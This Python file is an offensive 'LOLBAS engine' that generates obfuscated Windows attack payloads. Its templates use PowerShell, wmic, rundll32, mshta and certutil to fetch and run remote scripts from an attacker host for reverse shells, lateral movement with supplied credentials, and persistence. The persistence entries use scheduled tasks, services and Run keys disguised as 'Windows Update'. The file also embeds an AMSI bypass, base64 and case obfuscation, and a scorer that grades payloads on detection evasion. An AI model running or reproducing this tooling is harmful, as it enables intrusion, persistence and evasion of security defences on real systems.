"""
Enhanced LOLBAS Engine for Dynamic Evasion and Obfuscation
Provides advanced Living Off The Land techniques with dynamic adaptation
"""

import json
import random
import hashlib
import base64
import os
from typing import Dict, List, Any, Optional
from datetime import datetime
import re

class LolbasEngine:
    """Advanced LOLBAS engine with dynamic evasion capabilities"""
    
    def __init__(self):
        self.techniques = {}
        self.obfuscation_patterns = {}
        self.evasion_chains = {}
        self.detection_weights = {}
        self.load_techniques()
        self.load_obfuscation_patterns()
        self.load_evasion_chains()
        
    def load_techniques(self):
        """Load LOLBAS techniques database"""
        try:
            with open('src/data/lolbas_data.json', 'r') as f:
                data = json.load(f)
                self.techniques = data.get('techniques', {})
                self.detection_weights = data.get('detection_weights', {})
        except FileNotFoundError:
            self._create_default_techniques()
    
    def _create_default_techniques(self):
        """Create default LOLBAS techniques"""
        self.techniques = {
            "execution": {
                "powershell": {
                    "binary": "powershell.exe",
                    "commands": [
                        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command",
                        "powershell.exe -EncodedCommand",
                        "powershell.exe -File",
                        "powershell.exe -Command"
                    ],
                    "detection_level": "medium",
                    "variants": ["pwsh.exe", "powershell_ise.exe"]
                },
                "wmic": {
                    "binary": "wmic.exe",
                    "commands": [
                        "wmic process call create",
                        "wmic os get /format:",
                        "wmic datafile where name=",
                        "wmic /node: process call create"
                    ],
                    "detection_level": "low",
                    "variants": ["wmic.exe"]
                },
                "rundll32": {
                    "binary": "rundll32.exe",
                    "commands": [
                        "rundll32.exe javascript:",
                        "rundll32.exe shell32.dll,ShellExec_RunDLL",
                        "rundll32.exe advpack.dll,LaunchINFSection",
                        "rundll32.exe ieadvpack.dll,LaunchINFSection"
                    ],
                    "detection_level": "medium",
                    "variants": ["rundll32.exe"]
                },
                "regsvr32": {
                    "binary": "regsvr32.exe",
                    "commands": [
                        "regsvr32.exe /s /n /u /i:",
                        "regsvr32.exe /u /s",
                        "regsvr32.exe /i"
                    ],
                    "detection_level": "medium",
                    "variants": ["regsvr32.exe"]
                },
                "mshta": {
                    "binary": "mshta.exe",
                    "commands": [
                        "mshta.exe javascript:",
                        "mshta.exe vbscript:",
                        "mshta.exe http://",
                        "mshta.exe file://"
                    ],
                    "detection_level": "high",
                    "variants": ["mshta.exe"]
                }
            },
            "persistence": {
                "schtasks": {
                    "binary": "schtasks.exe",
                    "commands": [
                        "schtasks /create /tn",
                        "schtasks /change /tn",
                        "schtasks /run /tn"
                    ],
                    "detection_level": "medium",
                    "variants": ["schtasks.exe"]
                },
                "sc": {
                    "binary": "sc.exe",
                    "commands": [
                        "sc create",
                        "sc config",
                        "sc start"
                    ],
                    "detection_level": "high",
                    "variants": ["sc.exe"]
                }
            },
            "defense_evasion": {
                "certutil": {
                    "binary": "certutil.exe",
                    "commands": [
                        "certutil -urlcache -split -f",
                        "certutil -decode",
                        "certutil -decodehex"
                    ],
                    "detection_level": "medium",
                    "variants": ["certutil.exe"]
                },
                "bitsadmin": {
                    "binary": "bitsadmin.exe",
                    "commands": [
                        "bitsadmin /transfer",
                        "bitsadmin /create",
                        "bitsadmin /addfile"
                    ],
                    "detection_level": "low",
                    "variants": ["bitsadmin.exe"]
                }
            }
        }
        
        self.detection_weights = {
            "low": 1,
            "medium": 3,
            "high": 5
        }
    
    def load_obfuscation_patterns(self):
        """Load obfuscation patterns for technique modification"""
        self.obfuscation_patterns = {
            "string_obfuscation": [
                "base64_encode",
                "hex_encode",
                "unicode_escape",
                "string_reversal",
                "case_randomization"
            ],
            "command_obfuscation": [
                "parameter_splitting",
                "environment_variable_insertion",
                "path_randomization",
                "alias_substitution",
                "concatenation_splitting"
            ],
            "payload_obfuscation": [
                "xor_encoding",
                "compression",
                "file_embedding",
                "registry_storage",
                "steganography"
            ]
        }
    
    def load_evasion_chains(self):
        """Load evasion technique chains"""
        self.evasion_chains = {
            "low_detection": [
                ["bitsadmin", "wmic", "powershell"],
                ["certutil", "rundll32", "mshta"],
                ["wmic", "schtasks", "powershell"]
            ],
            "medium_detection": [
                ["powershell", "rundll32", "regsvr32"],
                ["mshta", "wmic", "certutil"],
                ["regsvr32", "schtasks", "sc"]
            ],
            "high_stealth": [
                ["bitsadmin", "certutil", "wmic"],
                ["wmic", "rundll32", "schtasks"],
                ["certutil", "powershell", "bitsadmin"]
            ]
        }
    
    def generate_dynamic_payload(self, objective: str, target_os: str = "windows", 
                                stealth_level: str = "medium") -> Dict[str, Any]:
        """Generate dynamically obfuscated payload"""
        
        # Select appropriate technique chain
        chain = self._select_technique_chain(stealth_level)
        
        # Generate base payload
        base_payload = self._generate_base_payload(objective, chain[0])
        
        # Apply obfuscation layers
        obfuscated_payload = self._apply_obfuscation(base_payload, stealth_level)
        
        # Create evasion wrapper
        evasion_wrapper = self._create_evasion_wrapper(obfuscated_payload, chain)
        
        # Calculate detection score
        detection_score = self._calculate_detection_score(chain, stealth_level)
        
        return {
            "payload": evasion_wrapper,
            "technique_chain": chain,
            "obfuscation_layers": self._get_applied_obfuscation(stealth_level),
            "detection_score": detection_score,
            "stealth_level": stealth_level,
            "timestamp": datetime.now().isoformat(),
            "payload_hash": hashlib.sha256(evasion_wrapper.encode()).hexdigest()[:16]
        }
    
    def _select_technique_chain(self, stealth_level: str) -> List[str]:
        """Select optimal technique chain based on stealth requirements"""
        if stealth_level == "low":
            return random.choice(self.evasion_chains["low_detection"])
        elif stealth_level == "high":
            return random.choice(self.evasion_chains["high_stealth"])
        else:
            return random.choice(self.evasion_chains["medium_detection"])
    
    def _generate_base_payload(self, objective: str, primary_technique: str) -> str:
        """Generate base payload using primary technique"""
        
        payloads = {
            "reverse_shell": {
                "powershell": "IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/shell.ps1')",
                "wmic": "wmic process call create \"powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/shell.ps1')\"",
                "rundll32": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/shell.ps1')\");",
                "mshta": "mshta javascript:a=GetObject(\"script:http://{host}:{port}/shell.hta\").Exec();close();",
                "certutil": "certutil -urlcache -split -f http://{host}:{port}/shell.exe %temp%\\shell.exe && %temp%\\shell.exe"
            },
            "persistence": {
                "schtasks": "schtasks /create /tn \"Windows Update\" /tr \"powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/persist.ps1')\" /sc daily /st 09:00",
                "sc": "sc create \"WindowsUpdate\" binpath= \"powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/persist.ps1')\" start= auto",
                "powershell": "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString(\"http://{host}:{port}/persist.ps1\")'"
            },
            "lateral_movement": {
                "wmic": "wmic /node:\"{target}\" /user:\"{user}\" /password:\"{pass}\" process call create \"powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/lateral.ps1')\"",
                "powershell": "Invoke-Command -ComputerName {target} -Credential (New-Object System.Management.Automation.PSCredential('{user}', (ConvertTo-SecureString '{pass}' -AsPlainText -Force))) -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/lateral.ps1')}"
            }
        }
        
        return payloads.get(objective, {}).get(primary_technique, "echo 'Payload not available'")
    
    def _apply_obfuscation(self, payload: str, stealth_level: str) -> str:
        """Apply multiple layers of obfuscation"""
        obfuscated = payload
        
        # Base64 encoding for medium/high stealth
        if stealth_level in ["medium", "high"]:
            obfuscated = base64.b64encode(obfuscated.encode()).decode()
            obfuscated = f"powershell -EncodedCommand {obfuscated}"
        
        # Additional obfuscation for high stealth
        if stealth_level == "high":
            # String splitting and concatenation
            obfuscated = self._apply_string_splitting(obfuscated)
            # Environment variable insertion
            obfuscated = self._apply_env_var_insertion(obfuscated)
            # Case randomization
            obfuscated = self._apply_case_randomization(obfuscated)
        
        return obfuscated
    
    def _apply_string_splitting(self, payload: str) -> str:
        """Apply string splitting obfuscation"""
        # Split strings and concatenate them
        if "powershell" in payload.lower():
            return payload.replace("powershell", "power'+'shell")
        return payload
    
    def _apply_env_var_insertion(self, payload: str) -> str:
        """Insert environment variables for obfuscation"""
        env_vars = ["%WINDIR%", "%TEMP%", "%USERPROFILE%", "%PROGRAMFILES%"]
        # This is a simplified example - real implementation would be more sophisticated
        return payload
    
    def _apply_case_randomization(self, payload: str) -> str:
        """Randomize case of command components"""
        if "powershell" in payload.lower():
            variants = ["PowerShell", "POWERSHELL", "powershell", "PowerSHELL", "POWERshell"]
            return payload.replace("powershell", random.choice(variants))
        return payload
    
    def _create_evasion_wrapper(self, payload: str, chain: List[str]) -> str:
        """Create evasion wrapper using technique chain"""
        wrapped = payload
        
        # Add AMSI bypass for PowerShell
        if any("powershell" in tech for tech in chain):
            amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
            wrapped = amsi_bypass + wrapped
        
        # Add execution policy bypass
        if "powershell" in wrapped.lower():
            wrapped = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{wrapped}\""
        
        return wrapped
    
    def _calculate_detection_score(self, chain: List[str], stealth_level: str) -> float:
        """Calculate detection probability score (0-100)"""
        base_score = 0
        
        # Calculate based on technique detection levels
        for technique in chain:
            for category in self.techniques.values():
                if technique in category:
                    detection_level = category[technique].get("detection_level", "medium")
                    base_score += self.detection_weights[detection_level]
        
        # Adjust for stealth level
        stealth_multipliers = {"low": 1.2, "medium": 0.8, "high": 0.5}
        final_score = base_score * stealth_multipliers.get(stealth_level, 1.0)
        
        # Normalize to 0-100 scale
        return min(100, max(0, final_score * 10))
    
    def _get_applied_obfuscation(self, stealth_level: str) -> List[str]:
        """Get list of applied obfuscation techniques"""
        if stealth_level == "low":
            return ["basic_encoding"]
        elif stealth_level == "medium":
            return ["base64_encoding", "parameter_obfuscation"]
        else:
            return ["base64_encoding", "string_splitting", "case_randomization", "env_var_insertion"]
    
    def get_technique_variants(self, technique: str) -> List[str]:
        """Get variants of a specific technique"""
        for category in self.techniques.values():
            if technique in category:
                return category[technique].get("variants", [technique])
        return [technique]
    
    def analyze_payload_quality(self, payload: str) -> Dict[str, Any]:
        """Analyze payload quality and provide recommendations"""
        
        quality_score = 100
        issues = []
        recommendations = []
        
        # Check for common detection patterns
        detection_patterns = [
            ("powershell", -10, "PowerShell usage detected"),
            ("IEX", -15, "Invoke-Expression usage detected"),
            ("DownloadString", -20, "Direct download method detected"),
            ("http://", -10, "Unencrypted HTTP connection"),
            ("cmd.exe", -5, "Command prompt usage"),
            ("echo", -5, "Basic echo command used")
        ]
        
        for pattern, penalty, message in detection_patterns:
            if pattern.lower() in payload.lower():
                quality_score += penalty
                issues.append(message)
        
        # Check for obfuscation presence
        obfuscation_indicators = [
            ("base64", +10, "Base64 encoding detected"),
            ("EncodedCommand", +15, "PowerShell encoded command"),
            ("javascript:", +5, "JavaScript obfuscation"),
            ("vbscript:", +5, "VBScript obfuscation")
        ]
        
        for indicator, bonus, message in obfuscation_indicators:
            if indicator in payload:
                quality_score += bonus
        
        # Generate recommendations
        if quality_score < 70:
            recommendations.extend([
                "Consider using LOLBAS techniques for better evasion",
                "Apply additional obfuscation layers",
                "Use encrypted communication channels",
                "Implement AMSI bypass techniques"
            ])
        
        return {
            "quality_score": max(0, min(100, quality_score)),
            "grade": self._get_quality_grade(quality_score),
            "issues": issues,
            "recommendations": recommendations,
            "evasion_level": "high" if quality_score > 80 else "medium" if quality_score > 60 else "low"
        }
    
    def _get_quality_grade(self, score: float) -> str:
        """Convert quality score to letter grade"""
        if score >= 90:
            return "A+"
        elif score >= 80:
            return "A"
        elif score >= 70:
            return "B"
        elif score >= 60:
            return "C"
        else:
            return "F"

# Global LOLBAS engine instance
lolbas_engine = LolbasEngine()
